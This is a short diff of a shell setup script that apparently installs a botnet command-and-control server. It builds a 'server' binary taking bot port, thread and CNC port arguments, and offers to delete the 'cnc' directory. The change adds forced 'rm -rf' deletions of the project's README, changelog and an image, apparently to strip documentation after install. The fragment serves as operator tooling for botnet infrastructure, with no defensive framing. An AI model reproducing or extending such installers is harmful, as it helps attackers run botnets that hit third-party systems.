@@ -10,6 +10,9 @@ sleep 1
 chmod +x server
 
 echo "DONE, USAGE->: screen ./server <botport> <threads> <cncport>"
+rm -rf README.md
+rm -rf Changelog.md
+rm -rf image.webp
 
 read -p "delete cnc dir (recommended)? (y/n): " answer
 if [ "$answer" == "y" ]; then
